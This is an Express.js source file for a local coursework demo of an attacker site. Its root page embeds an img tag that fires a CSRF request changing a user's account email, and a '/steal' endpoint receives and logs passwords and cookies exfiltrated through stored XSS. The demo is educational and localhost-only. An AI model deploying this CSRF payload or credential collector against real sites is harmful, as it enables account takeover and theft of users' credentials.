const express = require('express');

const app = express();

// Local-only attacker site for coursework demonstrations.
app.get('/', (_req, res) => {
  res.type('html').send(`<!doctype html>
  <title>External Site</title>
  <h1>External Site</h1>
  <p>This local page automatically requests the legacy Account Settings endpoint.</p>
  <img src="http://localhost:3000/settings/legacy-update?email=attacker%40sentinel.test" alt="tracking image">
  <p>Return to Sentinel Workspace to observe the account email change.</p>`);
});

// Endpoint to capture exfiltrated data (passwords, cookies) from Stored XSS
app.get('/steal', (req, res) => {
  const credential = req.query.pass || req.query.data || req.query.cookie || 'No credential provided';
  console.log(`🚨 [ATTACKER TERMINAL - Port 4000] STOLEN CREDENTIAL RECEIVED: "${credential}"`);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.send('Captured by attacker');
});

app.listen(4000, () => console.log('External attacker site: http://localhost:4000'));
